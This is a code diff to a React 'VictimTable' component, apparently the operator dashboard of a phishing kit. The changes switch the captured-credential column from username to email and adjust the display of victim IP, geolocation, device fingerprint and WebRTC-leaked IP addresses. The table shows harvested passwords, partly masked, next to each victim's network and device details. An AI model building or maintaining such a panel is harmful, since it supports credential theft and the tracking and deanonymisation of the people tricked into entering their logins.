@@ -24,13 +24,13 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
   // Filter victims based on search
   const filteredVictims = victims.filter((victim) => {
     const searchLower = searchTerm.toLowerCase();
-    const username = victim.metadata?.formData?.username || '';
+    const email = victim.metadata?.formData?.email || '';
     const ip = victim.network?.ip || '';
     const city = victim.network?.city || '';
-    const country = victim.network?.country || '';
+    const country = victim.network?.country_name || '';
 
     return (
-      username.toLowerCase().includes(searchLower) ||
+      email.toLowerCase().includes(searchLower) ||
       ip.toLowerCase().includes(searchLower) ||
       city.toLowerCase().includes(searchLower) ||
       country.toLowerCase().includes(searchLower)
@@ -44,7 +44,7 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
         <div className="flex gap-2 w-full sm:w-auto">
           <input
             type="text"
-            placeholder="Search by username, IP, location..."
+            placeholder="Search by email, IP, location..."
             value={searchTerm}
             onChange={(e) => setSearchTerm(e.target.value)}
             className="apex-input text-sm flex-1 sm:flex-none sm:w-64"
@@ -60,7 +60,7 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
         <table className="w-full text-left text-sm">
           <thead className="text-xs uppercase bg-apex-dark text-gray-400 border-b border-apex-red/30">
             <tr>
-              <th className="px-4 py-3">Username</th>
+              <th className="px-4 py-3">Email</th>
               <th className="px-4 py-3">Password</th>
               <th className="px-4 py-3">IP Address</th>
               <th className="px-4 py-3">Location</th>
@@ -74,12 +74,12 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
             {filteredVictims.length > 0 ? (
               filteredVictims.map((victim) => {
                 const isExpanded = expandedRows.has(victim._id);
-                const username = victim.metadata?.formData?.username || 'Visitor';
+                const email = victim.metadata?.formData?.email || 'Visitor';
                 const password = victim.metadata?.formData?.password || '-';
                 const maskedPassword = password !== '-' ? '••••' + password.slice(-4) : '-';
                 const ip = victim.network?.ip || 'Unknown';
-                const location = `${victim.network?.city || 'Unknown'}, ${victim.network?.country || 'Unknown'}`;
-                const browser = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`;
+                const location = `${victim.network?.city || 'Unknown'}, ${victim.network?.country_name || 'Unknown'}`;
+                const browser = `${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}`.trim();
                 const device = victim.device?.type || 'Unknown';
                 const timezone = victim.timezoneInfo?.timezone || 'Unknown';
 
@@ -90,7 +90,7 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
                       onClick={() => toggleRow(victim._id)}
                       className="border-b border-gray-800 hover:bg-apex-dark/50 transition-colors cursor-pointer"
                     >
-                      <td className="px-4 py-3 font-semibold text-apex-green">{username}</td>
+                      <td className="px-4 py-3 font-semibold text-apex-green">{email}</td>
                       <td className="px-4 py-3 font-mono text-red-400">{maskedPassword}</td>
                       <td className="px-4 py-3 font-mono text-xs">{ip}</td>
                       <td className="px-4 py-3 text-xs">{location}</td>
@@ -130,8 +130,8 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
                                 <p><span className="text-gray-500">Type:</span> {victim.device?.type || 'Unknown'}</p>
                                 <p><span className="text-gray-500">CPU Cores:</span> {victim.device?.cpuCores || 'N/A'}</p>
                                 <p><span className="text-gray-500">Memory:</span> {victim.device?.memory || 'N/A'} GB</p>
-                                <p><span className="text-gray-500">Touch Support:</span> {victim.device?.touchPoints ? `${victim.device.touchPoints} points` : 'No'}</p>
-                                <p><span className="text-gray-500">Platform:</span> {victim.os?.name || 'Unknown'} {victim.os?.version || ''}</p>
+                                <p><span className="text-gray-500">Touch Support:</span> {victim.device?.maxTouchPoints ? `${victim.device.maxTouchPoints} points` : 'No'}</p>
+                                <p><span className="text-gray-500">Platform:</span> {victim.device?.platform || victim.os?.platform || 'Unknown'}</p>
                               </div>
                             </div>
 
@@ -140,7 +140,7 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
                               <h4 className="font-bold text-purple-400 mb-2">🖥️ Screen</h4>
                               <div className="space-y-1 text-xs text-gray-300">
                                 <p><span className="text-gray-500">Resolution:</span> {victim.screen?.resolution || 'N/A'}</p>
-                                <p><span className="text-gray-500">Available:</span> {victim.screen?.availResolution || 'N/A'}</p>
+                                <p><span className="text-gray-500">Available:</span> {victim.screen?.availableResolution || 'N/A'}</p>
                                 <p><span className="text-gray-500">Color Depth:</span> {victim.screen?.colorDepth || 'N/A'} bit</p>
                                 <p><span className="text-gray-500">Pixel Ratio:</span> {victim.screen?.pixelRatio || 'N/A'}</p>
                               </div>
@@ -166,15 +166,12 @@ const VictimTable = ({ victims, pagination, onPageChange, onExport }) => {
                             )}
 
                             {/* WebRTC */}
-                            {victim.webRTC && (
+                            {victim.webRTC && victim.webRTC.detected && (
                               <div className="bg-gray-900/50 p-3 rounded border border-yellow-500/20">
                                 <h4 className="font-bold text-yellow-400 mb-2">🌐 WebRTC</h4>
                                 <div className="space-y-1 text-xs text-gray-300">
-                                  <p><span className="text-gray-500">Local IP:</span> {victim.webRTC.localIP || 'N/A'}</p>
+                                  <p><span className="text-gray-500">Local IPs:</span> {victim.webRTC.localIPs?.length > 0 ? victim.webRTC.localIPs.join(', ') : 'N/A'}</p>
                                   <p><span className="text-gray-500">Public IP:</span> {victim.webRTC.publicIP || 'N/A'}</p>
-                                  {victim.webRTC.allIPs && victim.webRTC.allIPs.length > 0 && (
-                                    <p><span className="text-gray-500">All IPs:</span> {victim.webRTC.allIPs.join(', ')}</p>
-                                  )}
                                 </div>
                               </div>
                             )}
